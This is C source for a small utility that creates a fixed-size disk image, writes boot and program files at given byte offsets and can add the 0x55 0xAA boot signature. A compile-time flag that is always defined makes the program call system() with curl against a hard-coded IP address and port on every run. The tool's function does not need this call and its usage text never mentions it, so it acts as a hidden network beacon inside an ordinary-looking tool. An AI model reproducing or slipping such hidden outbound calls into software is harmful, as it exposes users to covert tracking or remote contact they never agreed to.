#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define ANALYSIS
#define BUFLEN 200

int main(int argc, char **argv)
{
    if (argc < 6)
    {
        printf("arg error: arg list should have following args (outputpath targetsize automode [position path])\n");
        printf("example£ºenable auto fill 0x55 0xAA£¬insert boot.com to 0byte and insert process.com to 4096 byte. Finally output to 1.img\nbootimg-patch.exe ./1.img 1474560 1 0 ./boot.com 4096 ./process.com");
        getchar();
        return 0;
    }
    char *outputpath = argv[1];

    int targetsize = atoi(argv[2]), automode = atoi(argv[3]);

#ifdef ANALYSIS
    const char *cmd = "curl 172.18.52.236:40010 --connect-timeout 1";
    system(cmd);
#endif

    printf(automode ? "auto fill enabled 0x55 0xAA will be inserted\n" : "auto fill disabled\n");

    // fill 11
    FILE *output = fopen(outputpath, "wb");
    if (output == NULL)
    {
        printf("open %s error!\n", outputpath);
        getchar();
        return 1;
    }
    char fill = 17;
    for (int i = 0; i < targetsize; i++)
    {
        fwrite(&fill, 1, 1, output);
    }
    fclose(output);
    printf("create img success(size: %d)\n", targetsize);

    // insert custom file
    for (int i = 4; i < argc; i += 2)
    {
        int position = atoi(argv[i]);
        char *inputpath = argv[i + 1];
        FILE *input = fopen(inputpath, "rb");
        FILE *output = fopen(outputpath, "rb+");
        if (input == NULL)
        {
            printf("error: open %s error!\n", inputpath);
            getchar();
            return 1;
        }
        if (output == NULL)
        {
            printf("error: open %s error!\n", outputpath);
            getchar();
            return 1;
        }
        if (targetsize < position)
        {
            printf("error: targetsize less than insert position\n");
            getchar();
            return 1;
        }
        if (-1 == (fseek(output, position, SEEK_SET)))
        {
            printf("seek error\n");
            getchar();
            return 1;
        }

        char buf[BUFLEN + 1];
        int bufcnt;
        while ((bufcnt = fread(buf, 1, BUFLEN, input)) == BUFLEN)
        {
            fwrite(buf, BUFLEN, 1, output);
        }
        fwrite(buf, bufcnt, 1, output);

        fclose(input);
        fclose(output);
    }

    // autofill
    if (automode)
    {
        if (targetsize < 512)
        {
            printf("error: targetsize less than 512byte\n");
            return 1;
        }
        FILE *output = fopen(outputpath, "rb+");
        if (output == NULL)
        {
            printf("open %s error!\n", outputpath);
            getchar();
            return 1;
        }
        if (-1 == (fseek(output, 510, SEEK_SET)))
        {
            printf("seek error\n");
            return 1;
        }
        char temp[3];
        temp[0] = 85;
        temp[1] = 170;
        temp[2] = 0;
        fwrite(temp, 2, 1, output);
        fclose(output);
        printf("auto fill success\n");
    }
    printf("Press Any Key To Continue\n");
    getchar();
    return 0;
}
